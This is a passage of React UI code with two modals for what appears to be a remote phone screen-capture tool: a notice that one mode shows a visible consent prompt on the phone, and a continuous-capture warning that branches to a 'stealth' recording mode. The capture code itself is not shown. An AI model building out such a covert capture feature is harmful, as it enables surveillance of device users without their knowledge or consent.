                    <div className="clay-card max-w-sm w-full p-5 border border-amber-500/40 shadow-2xl space-y-4 rounded-3xl animate-in slide-in-from-bottom-4 sm:slide-in-from-bottom-0">
                        <div className="flex items-center gap-2.5 text-amber-400">
                            <AlertTriangle size={18} />
                            <span className="font-mono font-black text-xs uppercase tracking-wider">
                                Direct Authorization Notice
                            </span>
                        </div>
                        <p className="text-xs text-white/70 font-mono leading-relaxed">
                            This mode immediately shows a <span className="text-white font-bold">&quot;Start capturing screen?&quot;</span> prompt directly on the phone display. The user will observe this prompt.
                        </p>
                        <div className="flex gap-2 pt-1 font-mono">
                            <button
                                type="button"
                                onClick={() => setShowSimpleWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs text-white/50 hover:text-white border border-white/10 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                type="button"
                                onClick={() => {
                                    setShowSimpleWarn(false);
                                    fireStartRecord();
                                }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-black bg-amber-500 hover:bg-amber-400 text-black transition-all cursor-pointer"
                            >
                                Send Prompt
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ══════════════════════════════════════════════════════════════════ */}
            {/* ── MODAL: Continuous Capture Warning ──                          */}
            {/* ══════════════════════════════════════════════════════════════════ */}
            {showUnlimWarn && (
                <div
                    onClick={(e) => { if (e.target === e.currentTarget) setShowUnlimWarn(false); }}
                    className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-md flex items-end sm:items-center justify-center p-4 animate-in fade-in"
                >
                    <div className="clay-card max-w-sm w-full p-5 border border-rose-500/40 shadow-2xl space-y-4 rounded-3xl animate-in slide-in-from-bottom-4 sm:slide-in-from-bottom-0">
                        <div className="flex items-center gap-2.5 text-rose-400">
                            <AlertTriangle size={18} />
                            <span className="font-mono font-black text-xs uppercase tracking-wider">
                                Continuous Capture Advisory
                            </span>
                        </div>
                        <p className="text-xs text-white/70 font-mono leading-relaxed">
                            Continuous capture runs until you manually stop it or device connection resets. Prolonged active capture may cause device battery consumption alerts.
                        </p>
                        <div className="flex gap-2 pt-1 font-mono">
                            <button
                                type="button"
                                onClick={() => setShowUnlimWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs text-white/50 hover:text-white border border-white/10 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                type="button"
                                onClick={() => {
                                    setShowUnlimWarn(false);
                                    if (recMode === 'stealth') {
                                        setShowStealthQueuedModal(true);
                                    } else {
                                        fireStartRecord();
                                    }
                                }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-black bg-rose-500 hover:bg-rose-400 text-white transition-all cursor-pointer"
                            >
                                Proceed
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
